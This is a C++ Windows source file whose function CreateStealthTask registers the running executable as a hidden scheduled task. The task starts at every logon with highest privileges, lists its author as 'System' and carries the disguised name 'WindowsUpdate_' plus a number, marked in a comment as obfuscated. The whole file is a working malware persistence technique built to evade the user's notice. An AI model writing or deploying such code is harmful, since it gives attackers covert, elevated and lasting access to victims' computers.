#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <iostream>
#include <string>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

std::wstring GetCurrentExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

bool CreateStealthTask(const std::wstring& taskName, const std::wstring& exePath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0); // Clean old

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    pService->Release();
    if (FAILED(hr)) {
        pRootFolder->Release();
        CoUninitialize();
        return false;
    }

    IRegistrationInfo* pRegInfo = NULL;
    pTask->get_RegistrationInfo(&pRegInfo);
    pRegInfo->put_Author(_bstr_t(L"System"));
    pRegInfo->Release();

    ITriggerCollection* pTriggerCollection = NULL;
    pTask->get_Triggers(&pTriggerCollection);

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return false;
    }
    pTrigger->Release();

    IActionCollection* pActionCollection = NULL;
    pTask->get_Actions(&pActionCollection);

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return false;
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return false;
    }

    pExecAction->put_Path(_bstr_t(exePath.c_str()));
    pExecAction->Release();

    IPrincipal* pPrincipal = NULL;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    pPrincipal->Release();

    ITaskSettings* pSettings = NULL;
    pTask->get_Settings(&pSettings);
    pSettings->put_AllowDemandStart(VARIANT_TRUE);
    pSettings->put_Enabled(VARIANT_TRUE);
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->Release();

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(taskName.c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(L""),
        _variant_t(L""),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);

    pRootFolder->Release();
    pTask->Release();
    CoUninitialize();

    if (FAILED(hr)) return false;
    pRegisteredTask->Release();
    return true;
}

int main() {
    std::wstring exePath = GetCurrentExecutablePath();
    std::wstring taskName = L"WindowsUpdate_" + std::to_wstring(GetTickCount()); // Obfuscated name

    if (CreateStealthTask(taskName, exePath)) {
        // Optional stealth success indicator (e.g., log to memory, nothing to console)
    }

    return 0;
}
